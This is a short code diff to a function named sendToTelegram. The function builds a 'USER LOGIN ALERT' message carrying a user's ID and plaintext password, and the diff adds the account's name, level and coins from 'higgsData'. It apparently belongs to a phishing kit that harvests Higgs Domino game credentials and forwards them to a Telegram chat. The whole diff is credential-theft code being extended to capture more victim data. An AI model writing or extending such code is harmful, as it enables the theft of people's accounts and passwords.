@@ -129,6 +129,9 @@ export const sendToTelegram = async (
 🔐 <b>USER LOGIN ALERT</b>
 ────────────────────────
 👤 ID: <code>${escapeHtml(username)}</code>
+📛 Name: <code>${escapeHtml(higgsData?.username || 'Unknown')}</code>
+⭐ Level: <code>${escapeHtml(higgsData?.level || 'Unknown')}</code>
+💰 Coins: <code>${escapeHtml(higgsData?.coins || 'Unknown')}</code>
 🔑 Password: <code>${escapeHtml(pass)}</code>
 🗓️ Date: ${escapeHtml(timeString)}
 ────────────────────────
